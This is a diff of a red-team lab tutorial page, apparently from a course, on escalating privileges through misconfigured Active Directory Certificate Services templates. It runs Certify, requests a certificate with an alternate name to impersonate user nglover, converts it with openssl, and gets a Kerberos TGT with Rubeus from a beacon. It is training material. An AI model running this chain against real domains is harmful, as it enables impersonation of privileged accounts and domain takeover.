@@ -1,6 +1,8 @@
 # Misconfigured certificate Templates
 
-AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates. They are designed to be duplicated and configured for specific needs. Misconfigurations within these templates can be abused for privilege escalation.
+
+
+AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
 
 As `iyates` on **WKSTN-3**, use the [Certify](https://github.com/GhostPack/Certify) tool to find any vulnerable templates:
 
@@ -11,7 +13,7 @@ beacon> getuid
 beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
 ```
 
-![.gitbook/assets/1663788081.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788081/q22phgtich32pfa30ban.png)
+![](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/certify-vuln-template.png)
 
 Let's go through the key parts of this output.
 
@@ -21,9 +23,9 @@ Let's go through the key parts of this output.
 4. The certificate usage has **Client Authentication** set.
 5. Domain Users have enrolment rights, so any domain user may request a certificate from this template
 
-If a principal you control had WriteOwner, WriteDacl or WriteProperty, then this could also be abused.
+&#x20; If a principal you control had WriteOwner, WriteDacl or WriteProperty, then this could also be abused.
 
-This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain. Request a certificate for **nglover**.
+This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain.  Request a certificate for **nglover**.
 
 ```
 beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
@@ -60,7 +62,7 @@ Xm58FnNpAvwXQi1Vu+xIdtpRSGsnl6T6/TYwJlhKqMEU9mRfgaWXgLS+HdS++aw=
 Certify completed in 00:00:16.3844085
 ```
 
-Copy the whole certificate (including the private key) and save it to `cert.pem` on the Kali VM. Then use the `openssl` command to convert it into pfx format. You may enter a password (recommended) or leave it blank.
+Copy the whole certificate (including the private key) and save it to `cert.pem` on the Kali VM.  Then use the `openssl` command to convert it into pfx format.  You may enter a password (recommended) or leave it blank.
 
 ```
 root@kali:~# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
@@ -68,7 +70,7 @@ Enter Export Password:
 Verifying - Enter Export Password:
 ```
 
-Convert `cert.pfx` into a base64 encoded string: `cat cert.pfx | base64 -w 0` and use `Rubeus asktgt` to request a TGT using this certificate.
+Convert `cert.pfx` into a base64 encoded string:  `cat cert.pfx | base64 -w 0` and use `Rubeus asktgt` to request a TGT using this certificate.
 
 ```
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap
